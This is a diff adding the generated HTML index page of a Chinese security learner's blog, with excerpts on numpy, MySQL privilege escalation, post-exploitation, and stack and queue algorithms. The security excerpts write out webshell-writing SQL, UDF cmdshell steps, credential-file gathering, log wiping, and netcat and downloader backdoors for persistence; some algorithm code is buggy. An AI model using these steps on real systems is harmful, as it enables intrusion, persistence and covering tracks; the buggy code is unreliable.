@@ -1,5 +1,433 @@
-extends includes/layout.pug
-
-block content
-  include includes/recent-posts.pug
-  include includes/pagination.pug
+<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="白帽子星晴的成长记录博客"><meta name="keywords" content><meta name="author" content="starjian"><meta name="copyright" content="starjian"><title>努力努力再努力 | 星晴</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  }
+} </script><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">starjian</div><div class="author-info__description text-center">白帽子星晴的成长记录博客</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">33</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">13</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">3</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">星晴</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">星晴</div><div id="site-sub-title">努力努力再努力</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2019/07/27/numpy-shi-yong-zong-jie/">numpy使用总结</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-07-27</time><div class="content"><h1 id="numpy库使用总结笔记"><a href="#numpy库使用总结笔记" class="headerlink" title="numpy库使用总结笔记"></a>numpy库使用总结笔记</h1><hr>
+<p><strong>anaconda一些基础使用命令</strong>:</p>
+<p><code>conda list</code>:显示已经安装的库</p>
+<p><code>conda install numpy</code>:安装指定的库，类似于pip</p>
+<p><code>anaconda search -t conda tensorflow</code> :显示可以安装的tensorflow的版本</p>
+<p><code>anaconda show lwalkling/tensorflow-gpu</code>:显示如何安装tensorflow</p>
+<hr>
+<h2 id="2-numpy对文件的读取"><a href="#2-numpy对文件的读取" class="headerlink" title="2. numpy对文件的读取;"></a>2. numpy对文件的读取;</h2><p><code>numpy.genfromtxt</code>:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">world_alcohol = numpy.genfromtxt(<span class="string">"world_alcohol.txt"</span>,delimiter=<span class="string">","</span>,dtype = str)</span><br></pre></td></tr></table></figure>
+<h2 id="3-numpy的基础结构"><a href="#3-numpy的基础结构" class="headerlink" title="3. numpy的基础结构"></a>3. numpy的基础结构</h2><h3 id="np-array"><a href="#np-array" class="headerlink" title="np.array"></a>np.array</h3><p>创建的矩阵里面是一个值，这个值是写死的，也就是不可变数组,且数组里面值是同一个类型，如果一个值是字符，那么所有的元素都将转化为一种类型</p>
+<p>创建数组:  <code>np.array([1,2,3,5])</code></p>
+<p>创建矩阵： <code>a=np.array([[1,2,3],[2,3,4]])</code></p>
+<p>查看矩阵的大小: <code>a.shape</code></p>
+<p>查看矩阵里面元素的类型: <code>a.dtype</code></p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/07/20/windows-fu-wu-qi-quan-xian-fen-xi/">windows服务器权限分析</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-07-20</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/07/17/mysql-ti-quan-bi-ji/">mysql提权笔记</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-07-17</time><div class="content"><h2 id="0x01-phpnyadmin一句话提权"><a href="#0x01-phpnyadmin一句话提权" class="headerlink" title="0x01 phpnyadmin一句话提权"></a>0x01 phpnyadmin一句话提权</h2><p>利用条件:</p>
+<ul>
+<li><p>查询：SHOW VARIABLES LIKE “secure_file_priv”，为null</p>
+</li>
+<li><p><code>select&#39;&lt;?php @eval($_POST[td]);?&gt;&#39;INTO OUTFILE &#39;C:\\phpStudy\\PHPTutorial\\WWW\\door.php&#39;</code> </p>
+</li>
+</ul>
+<p>使用日志文件:</p>
+<p><code>set global general_log = &quot;ON&quot;;</code></p>
+<p><code>SET global general_log_file=&#39;C:/phpStudy/PHPTutorial/WWW/door.php&#39;;</code></p>
+<p><code>select &#39;&lt;?php eval($_POST[td]);?&gt;&#39;;</code></p>
+<hr>
+<h2 id="0x02-mof提权"><a href="#0x02-mof提权" class="headerlink" title="0x02 mof提权"></a>0x02 mof提权</h2><p>利用条件</p>
+<ul>
+<li><p>windows&lt;=2003</p>
+</li>
+<li><p>可写入c:/windows/system32/mof目录  ，此文件会自动执行</p>
+</li>
+</ul>
+<p><code>select load_file(&#39;C:/wmpub/nullevt.mof&#39;) into dumpfile</code><br><code>&#39;c:/windows/system32/wbem/mof/nullevt.mof’</code></p>
+<hr>
+<h2 id="0x03-udf提权操作"><a href="#0x03-udf提权操作" class="headerlink" title="0x03 udf提权操作"></a>0x03 udf提权操作</h2><p><strong>利用条件</strong></p>
+<ul>
+<li>账号具有对Mysql的insert和delete权限</li>
+</ul>
+<p><strong>利用过程</strong></p>
+<ol>
+<li><p>获取相应权限后上传udf.php</p>
+</li>
+<li><p>访问udf.php进行连接（需要能够远程连接）</p>
+</li>
+<li><p>D:\xampp\mysql\lib\plugin\udf.dll<br>链接成功后导出DLL文件（注意目录）<br>mysql&lt;5.0，导出路径随意；<br>5.0&lt;=mysql&lt;5.1，则需要导出至目标服务器的系统目录（如：system32）<br>mysql&gt;5.1，需要导出到mysql的插件目录<br>查看插件目录：show variables like ‘%plugin%’; </p>
+</li>
+<li><p>创建自定义函数：Create Function cmdshell returns string soname ‘udf.dll’</p>
+<p>已经存在：drop function cmdshell;</p>
+</li>
+<li><p>执行函数：select cmdshell(‘ipconfig’)</p>
+</li>
+</ol>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/07/17/li-yong-pei-zhi-bu-dang-ti-quan/">利用配置不当提权</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-07-17</time><div class="content"><h1 id="利用配置不当提权-后渗透测试"><a href="#利用配置不当提权-后渗透测试" class="headerlink" title="利用配置不当提权,后渗透测试"></a>利用配置不当提权,后渗透测试</h1><h2 id="0x01-利用条件"><a href="#0x01-利用条件" class="headerlink" title="0x01  利用条件"></a>0x01  利用条件</h2><ul>
+<li><p>权限分配不当，编写的软件直接是用system权限运行的，一些服务是以system运行的，如果可以替换文件为恶意的代码，然后服务启动的时候就会反弹回一个root的shell</p>
+</li>
+<li><p>找到一些默认system执行的服务，尝试替换启动服务的执行程序。</p>
+</li>
+<li>NTFS权限允许users修改删除</li>
+</ul>
+<h2 id="0x02-命令行下快速发现不当配置"><a href="#0x02-命令行下快速发现不当配置" class="headerlink" title="0x02 命令行下快速发现不当配置"></a>0x02 命令行下快速发现不当配置</h2><h3 id="1-icals-windows"><a href="#1-icals-windows" class="headerlink" title="1.  icals:(windows)"></a>1.  icals:(windows)</h3><p><code>icacls C:\windows\*.exe /save perm /T</code>   save成perm文件名，且循环遍历windows目录</p>
+<p>BU是普通users组，PU是powersuser组权限，查找文件下的FA::BU</p>
+<p><code>i586-mingw32msvc-gcc -o admin.exe admin.c</code>  编译成exe程序。 </p>
+<p>2.Find:(linux)</p>
+<p><code>find / -perm 777 -exec ls -l {} \;</code></p>
+<p> -perm指定权限</p>
+<h2 id="0x03-利用配置不当提权"><a href="#0x03-利用配置不当提权" class="headerlink" title="0x03 利用配置不当提权"></a>0x03 利用配置不当提权</h2><h3 id="应用系统的配置文件"><a href="#应用系统的配置文件" class="headerlink" title="应用系统的配置文件"></a><strong>应用系统的配置文件</strong></h3><ul>
+<li>应用连接数据库的配置文件</li>
+<li>后台服务运行账号</li>
+</ul>
+<h2 id="0x04-信息收集"><a href="#0x04-信息收集" class="headerlink" title="0x04 信息收集"></a>0x04 信息收集</h2><h3 id="1-linux基本的信息收集"><a href="#1-linux基本的信息收集" class="headerlink" title="1.linux基本的信息收集"></a>1.linux基本的信息收集</h3><p> <img src="/.com//1563365430694.png" alt="1563365430694"></p>
+<p>第一个是dns配置文件，做dns的劫持</p>
+<p>shadow是用户名的密码，离线破解密码</p>
+<h3 id="2-windows下的信息收集"><a href="#2-windows下的信息收集" class="headerlink" title="2.windows下的信息收集"></a>2.windows下的信息收集</h3><p><img src="/.com//1563365691394.png" alt="1563365691394"></p>
+<p>  net share 开启一个共享，把c盘共享无限制。</p>
+<p>域管理员将其激活。</p>
+<p><img src="/.com//1563366041513.png" alt="1563366041513"></p>
+<p>WMIC执行普通命令行无法执行的命令。</p>
+<p>第一个读取mac和ip</p>
+<p><img src="/.com//1563366249277.png" alt="1563366249277"></p>
+<p>查看当前系统的进程。</p>
+<p><img src="/.com//1563366345007.png" alt="1563366345007"></p>
+<p>结束calc.exe的进程</p>
+<p><img src="/.com//1563366442364.png" alt="1563366442364"></p>
+<p>得到系统安装的软件的版本以及名字</p>
+<p><img src="/.com//1563366507692.png" alt="1563366507692"></p>
+<p>删除杀毒软件在后台偷偷删掉：</p>
+<p><img src="/.com//1563366526660.png" alt="1563366526660"></p>
+<p>查看共享文件夹</p>
+<p><img src="/.com//1563366556772.png" alt="1563366556772"></p>
+<p>开启远程3389桌面</p>
+<p><img src="/.com//1563366583781.png" alt="1563366583781"></p>
+<p>machinename修改为localhost</p>
+<p>查看日志：</p>
+<p><img src="/.com//1563366679612.png" alt="1563366679612"></p>
+<h3 id="3-linux收集敏感信息"><a href="#3-linux收集敏感信息" class="headerlink" title="3.linux收集敏感信息"></a>3.linux收集敏感信息</h3><p> linux下:</p>
+<ul>
+<li><p>/etc: 大量的配置文件  </p>
+</li>
+<li><p>/etc/local/etc</p>
+</li>
+<li><p>/etc/passwd</p>
+</li>
+<li><p>/etc/shadow</p>
+</li>
+<li><p>.ssh；.gnupg  一般都是隐藏的使用ls -la显示出.   .ssh存在已经登录过的ssh密钥</p>
+</li>
+<li><p>业务数据库</p>
+</li>
+<li><p>e-mail 身份认证服务器数据库</p>
+</li>
+<li><p>/tmp 临时目录存放临时数据</p>
+</li>
+</ul>
+<h3 id="4-windows敏感信息收集"><a href="#4-windows敏感信息收集" class="headerlink" title="4.windows敏感信息收集"></a>4.windows敏感信息收集</h3><ul>
+<li>Sam数据库；注册表文件 </li>
+<li>%SYSTEMROOT%\repair\SAM sam修复时候保存的副本</li>
+<li>%SYSTEMROOT%\System32\config\RegBack\Sam</li>
+<li>业务数据库</li>
+<li>临时文件目录</li>
+<li>userProfile\APPData\Local\Microsoft\windows\Temporart internet Files\</li>
+</ul>
+<h2 id="0x05-隐藏痕迹"><a href="#0x05-隐藏痕迹" class="headerlink" title="0x05 隐藏痕迹"></a>0x05 隐藏痕迹</h2><ul>
+<li>禁止在登录界面显示新建账号</li>
+</ul>
+<p><img src="/.com//1563367503819.png" alt="1563367503819"></p>
+<ul>
+<li><p>删除日志文件</p>
+<p><img src="/.com//1563367630425.png" alt="1563367630425"></p>
+</li>
+<li><p>History  history -c清除</p>
+</li>
+<li><p>lsattr 查看文件的权限</p>
+</li>
+<li><p>chattr +i .bash_history  历史命令不会添加在bash历史文件中 先删除再创建在加i</p>
+</li>
+<li><p>日志</p>
+<p>auth.log/secure 登录日志</p>
+<p>btmp/wtmp 数据文件 last查看历史登录信息 lastb </p>
+<p>lastlog faillog  /var/log</p>
+</li>
+</ul>
+<ul>
+<li>其他日志和HIDS等</li>
+</ul>
+<h2 id="0x06-放置隐藏后门"><a href="#0x06-放置隐藏后门" class="headerlink" title="0x06 放置隐藏后门"></a>0x06 放置隐藏后门</h2><h4 id="1-添加到自启项"><a href="#1-添加到自启项" class="headerlink" title="1.添加到自启项"></a>1.添加到自启项</h4><p><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v AUTORUN /t</code><br><code>REG_SZ /d &#39;C:\svchost.exe /f</code></p>
+<ul>
+<li>下载nc.exe到目录\system32\nc.exe</li>
+<li><p><code>reg add &quot;HKLM\software\microsoft\windows\currentversion\run&quot; /f /v &quot;system&quot; /t REG_SZ</code><br><code>/d &quot;C:\windows\system32\nc.exe -Ldp 1234 -e cmd.exe&quot;</code></p>
+</li>
+<li><p>接受反弹的shell</p>
+</li>
+</ul>
+<p>​        <code>nc -nv 目标机器端口</code></p>
+<h4 id="2-vbs脚本"><a href="#2-vbs脚本" class="headerlink" title="2.vbs脚本"></a>2.vbs脚本</h4><figure class="highlight vbs"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Dim</span> objShell</span><br><span class="line"><span class="keyword">Set</span> objShell = WScript.<span class="built_in">CreateObject</span>(<span class="string">"WScript.shell"</span>)</span><br><span class="line">objShell.run <span class="string">"C:\windows\system32\nc.exe -Ldp 1234 -e cmd.exe"</span></span><br><span class="line"><span class="keyword">Set</span> objShell = <span class="literal">Nothing</span></span><br><span class="line">vbs</span><br></pre></td></tr></table></figure>
+<h4 id="3-python"><a href="#3-python" class="headerlink" title="3.python"></a>3.python</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">exe = <span class="string">'http://dwiadwaad/svchost.exe'</span></span><br><span class="line">r = requests.get(exe)</span><br><span class="line"><span class="keyword">if</span> os.path.exists(os.path.abspath(os.curdir)+<span class="string">r"\svchost.tmp.exe"</span>): <span class="comment"># if_muma.exe_exists</span></span><br><span class="line">os.popen(os.path.abspath(os.curdir)+<span class="string">r"\svchost.tmp.exe"</span>) <span class="comment">#exec_muma.exe</span></span><br></pre></td></tr></table></figure>
+<p><code>attrib +a +b +r +h</code> 隐藏文件的操作</p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/07/15/zhan-he-dui-lie-suan-fa-ti/">栈和队列算法题</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-07-15</time><div class="content"><h1 id="栈和队列的算法"><a href="#栈和队列的算法" class="headerlink" title="栈和队列的算法"></a>栈和队列的算法</h1><hr>
+<h2 id="1-设计一个栈，在实现栈的基本功能的基础上，再实现返回栈中的最小元素的操作"><a href="#1-设计一个栈，在实现栈的基本功能的基础上，再实现返回栈中的最小元素的操作" class="headerlink" title="1.设计一个栈，在实现栈的基本功能的基础上，再实现返回栈中的最小元素的操作"></a>1.设计一个栈，在实现栈的基本功能的基础上，再实现返回栈中的最小元素的操作</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">设计一个栈，在实现栈的基本功能的基础上，再实现返回栈中的最小元素的操作</span></span><br><span class="line"><span class="string">1. 要求pop、push、getMin操作的时间复杂度都是O(1)</span></span><br><span class="line"><span class="string">2. 设计的栈类型可以使用现成的栈结构</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getMinStack</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">		self.mydeque=deque()</span><br><span class="line">		self.mixdeque=deque()</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(self,element)</span>:</span></span><br><span class="line">		<span class="keyword">if</span>(len(self.mydeque)==<span class="number">0</span>):</span><br><span class="line">			self.mydeque.append(element)</span><br><span class="line">			self.mixdeque.append(element)</span><br><span class="line">		<span class="keyword">elif</span> <span class="keyword">not</span> element&gt;mixdeque[<span class="number">-1</span>]:</span><br><span class="line">			self.mixdeque.append(element)</span><br><span class="line">		self.mydeque.append(element)</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">pop</span><span class="params">(self)</span>:</span></span><br><span class="line">		element=self.mydeque.pop()</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> element&gt;self.mixdeque[<span class="number">-1</span>]:</span><br><span class="line">			self.mixdeque.pop()</span><br><span class="line">		<span class="keyword">return</span> element</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">getMix</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="keyword">return</span> self.mixdeque[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __main__==<span class="string">"__name__"</span>:</span><br><span class="line">	test=getMinStack()</span><br><span class="line">	a=range(<span class="number">1</span>,<span class="number">100</span>,<span class="number">2</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> random.sample(a, <span class="number">9</span>):</span><br><span class="line">		test.push(i)</span><br></pre></td></tr></table></figure>
+<h2 id="2-用两个栈组成队列"><a href="#2-用两个栈组成队列" class="headerlink" title="2.用两个栈组成队列"></a>2.用两个栈组成队列</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TwoStackQueue</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    初始化两个空栈</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.stackPush=deque()</span><br><span class="line">        self.stackPop=deque()</span><br><span class="line">    </span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    向栈中添加元素,直接将元素加到push栈里面</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self,number)</span>:</span></span><br><span class="line">         self.stackPush.append(number)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    pop需要先将push的一次倒出装到pop里面，然后从pop栈里面pop出一个元素</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> len(self.stackPop)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> self.stackPop.pop()</span><br><span class="line">        <span class="keyword">elif</span> len(self.stackPush)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">while</span> len(self.stackPush)&gt;<span class="number">0</span>:</span><br><span class="line">                self.stackPush.add(self.stackPush.pop())</span><br><span class="line">            <span class="keyword">return</span> self.stackPop.pop()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"empty queue"</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">peak</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> len(self.stackPop)==<span class="number">0</span>&amp;&amp;len(self.stackPush)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"empty queue"</span>)</span><br><span class="line">        <span class="keyword">elif</span> len(self.stackPush)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">while</span> len(self.stackPush)==<span class="number">0</span>:</span><br><span class="line">                self.stackPush.append(self.stackPush.pop())</span><br><span class="line">        <span class="keyword">return</span> self.stackPop[<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>
+<h2 id="3-使用仅用递归函数和栈逆序一个栈"><a href="#3-使用仅用递归函数和栈逆序一个栈" class="headerlink" title="3.使用仅用递归函数和栈逆序一个栈"></a>3.使用仅用递归函数和栈逆序一个栈</h2><p>递归的基本思想，是把规模较大的一个问题，分解成规模较小的多个子问题去解决，而每一个子问题又可以继续拆分成多个更小的子问题。或者说，必须先解决子问题，再基于子问题来解决当前问题。既然我们要逆序一个栈，就要将栈的最底部拿出来，先这样考虑，极限的情况下，栈只有一个元素，那么直接就弹出这个元素，不需要逆序，如果是两个的元素，先取出一个如果栈不是空的，就继续取，将最低的元素取出返回，再压栈。那么第一个函数 是:</p>
+<p><img src="/.com//1563348840255.png" alt="1563348840255"></p>
+<p>这个时候的函数为:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAndRemoveLast</span><span class="params">(mylist)</span>:</span></span><br><span class="line">    result=mylist.pop()</span><br><span class="line">    <span class="keyword">if</span> len(mylist)==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        last=getAndRemoveLast(mylist)</span><br><span class="line">        mylist.push(result)</span><br><span class="line">        <span class="keyword">return</span> last</span><br></pre></td></tr></table></figure>
+<p><img src="/.com//1563349656167.png" alt="1563349656167"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">revers</span><span class="params">(mylist)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(mylist)==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    temp=getAndRemoveLast(mylist)</span><br><span class="line">    revers(mylist)</span><br><span class="line">    mylist.push(temp)</span><br></pre></td></tr></table></figure>
+<h2 id="4-用一个栈实现另一个栈的排序"><a href="#4-用一个栈实现另一个栈的排序" class="headerlink" title="4.用一个栈实现另一个栈的排序"></a>4.用一个栈实现另一个栈的排序</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sortBystack</span><span class="params">(mylist)</span>:</span></span><br><span class="line">    helpstack=deque()</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    只要栈不为空，就取出当前栈的最顶点的，然后和辅助栈的最上面进行比较，如果辅助栈比较大，就弹出来装到当前栈，这样的话，就会将辅助栈所有比当前栈顶大的全部放到当前栈</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">while</span> len(mylist)&gt;<span class="number">0</span>:</span><br><span class="line">        temp=mylist.pop()</span><br><span class="line">        <span class="keyword">while</span> len(helpstack)&gt;<span class="number">0</span>&amp;&amp;(helpstack[<span class="number">-1</span>]&gt;temp):</span><br><span class="line">            mylist.append(helpstack.pop())</span><br><span class="line">        helpstack.append(temp)</span><br><span class="line">    <span class="keyword">while</span> len(helpstack)&gt;<span class="number">0</span>:</span><br><span class="line">        mylist.append(helpstack.pop())</span><br></pre></td></tr></table></figure>
+<h2 id="5-正常的汉贝塔问题"><a href="#5-正常的汉贝塔问题" class="headerlink" title="5.正常的汉贝塔问题"></a>5.正常的汉贝塔问题</h2><p>A，B，C三个圆柱，分别为初始位，过渡位，目标位，设A柱为初始位，C位为最终目标位。</p>
+<p>（1）将最上面的n-1个圆盘从初始位移动到过渡位</p>
+<p>（2）将初始位的最底下的一个圆盘移动到目标位</p>
+<p>（3）将过渡位的n-1个圆盘移动到目标位</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hanbei</span><span class="params">(n,a,b,c)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'&#123;0&#125;--&gt;&#123;1&#125;'</span>.format(a,c))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hanbei(n<span class="number">-1</span>,a,c,b)</span><br><span class="line">        print(<span class="string">'&#123;0&#125;--&gt;&#123;1&#125;'</span>.format(a,c))</span><br><span class="line">        hanbei(n<span class="number">-1</span>,b,a,c)</span><br><span class="line"></span><br><span class="line">hanbei(<span class="number">3</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="6-用栈来求解有限制的汉贝塔问题"><a href="#6-用栈来求解有限制的汉贝塔问题" class="headerlink" title="6.用栈来求解有限制的汉贝塔问题"></a>6.用栈来求解有限制的汉贝塔问题</h2><p>不能从最右边的塔直接移动道最左侧，也不能从最左侧搬到最右侧，必须经过中间。</p>
+<h2 id="7-滑动窗口"><a href="#7-滑动窗口" class="headerlink" title="7.滑动窗口"></a>7.滑动窗口</h2><p>有一个整数数组arr和一个大小为w的窗口从数组的最左边滑到最右边，窗口每次都向右边滑一个位置，输入:整形数组arr，窗口大小为w</p>
+<p>输出：一个长度为n-w+1的数组res,res[i]表示每一种窗口状态下的最大值</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">slide_windows</span><span class="params">(arr,w_size)</span>:</span></span><br><span class="line">    max_arr=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)-w_size+<span class="number">1</span>):</span><br><span class="line">        new_arr=arr[i:i+w_size]</span><br><span class="line">        max_arr.append(max(new_arr))</span><br><span class="line">    <span class="keyword">return</span> max_arr</span><br><span class="line">max_arr=slide_windows([<span class="number">4</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>],<span class="number">3</span>)</span><br><span class="line">print(max_arr)</span><br></pre></td></tr></table></figure>
+<h2 id="8-求最大子矩阵的大小"><a href="#8-求最大子矩阵的大小" class="headerlink" title="8.求最大子矩阵的大小"></a>8.求最大子矩阵的大小</h2><p>题目描述：给定一个整形的矩阵map，其中给的值只有0和1两种，求其中全是1的所有矩阵区域中，最大的矩形区域为1的数量。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">maxRecSize</span><span class="params">(map)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxRecFromBottom</span><span class="params">(height)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> height == <span class="literal">None</span> <span class="keyword">or</span> len(height) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        stack = []</span><br><span class="line">        maxArea = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(height)):</span><br><span class="line">            <span class="keyword">while</span> stack <span class="keyword">and</span> height[stack[<span class="number">-1</span>]] &gt;= height[i]:</span><br><span class="line">                j = stack.pop()</span><br><span class="line">                k = stack[<span class="number">-1</span>] <span class="keyword">if</span> stack <span class="keyword">else</span> <span class="number">-1</span></span><br><span class="line">                maxArea = max(maxArea, (i-k<span class="number">-1</span>) * height[j])</span><br><span class="line">            stack.append(i)</span><br><span class="line">        <span class="keyword">while</span> stack:</span><br><span class="line">            j = stack.pop()</span><br><span class="line">            k = stack[<span class="number">-1</span>] <span class="keyword">if</span> stack <span class="keyword">else</span> <span class="number">-1</span></span><br><span class="line">            maxArea = max(maxArea, (len(height)-k<span class="number">-1</span>) * height[j])</span><br><span class="line">        <span class="keyword">return</span> maxArea</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> map == <span class="literal">None</span> <span class="keyword">or</span> len(map) == <span class="number">0</span> <span class="keyword">or</span> len(map[<span class="number">0</span>]) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    height = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(map[<span class="number">0</span>]))]</span><br><span class="line">    maxArea = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(map)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(map[<span class="number">0</span>])):</span><br><span class="line">            height[j] = <span class="number">0</span> <span class="keyword">if</span> map[i][j] == <span class="number">0</span> <span class="keyword">else</span> height[j] + <span class="number">1</span></span><br><span class="line">        maxArea = max(maxArea, maxRecFromBottom(height))</span><br><span class="line">    <span class="keyword">return</span> maxArea</span><br></pre></td></tr></table></figure>
+<h2 id="9-两数相加"><a href="#9-两数相加" class="headerlink" title="9.两数相加"></a>9.两数相加</h2><p>给出两个 <strong>非空</strong> 的链表用来表示两个非负的整数。其中，它们各自的位数是按照 <strong>逆序</strong> 的方式存储的，并且它们的每个节点只能存储 <strong>一位</strong> 数字。</p>
+<p>如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和。</p>
+<p>您可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p>
